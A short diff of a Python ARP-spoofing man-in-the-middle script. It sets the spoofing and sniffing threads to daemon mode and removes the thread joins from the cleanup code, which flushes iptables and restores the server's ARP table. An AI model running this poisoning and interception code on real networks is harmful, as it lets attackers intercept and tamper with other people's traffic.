@@ -81,11 +81,14 @@ try:
 
     # ARP Spoof in a loop
     thread1 = threading.Thread(target=ARP_loop, args=(args.server_ip, args.target_ip))
+    thread1.daemon = True
     thread1.start()
     thread2 = threading.Thread(target=ARP_loop, args=(args.target_ip, args.server_ip))
+    thread2.daemon = True
     thread2.start()
     print(f"\nSent ARPs")
     thread3 = threading.Thread(target=sniff_sniff)
+    thread3.daemon = True
     thread3.start()
 
     nfqueue = NetfilterQueue()                       
@@ -95,9 +98,6 @@ try:
 except KeyboardInterrupt:
     os.system('iptables -F')                     # flush all iptables rule
     finished = True  # Signal the thread to stop
-    thread1.join() 
-    thread2.join() 
-    thread3.join()
     packet = Ether(src=target_MAC, dst=server_MAC) / ARP(op=2, pdst=args.server_ip, psrc=args.target_ip)
     sendp(packet, iface=interface)
     print(f"\nFixed server ARP table")
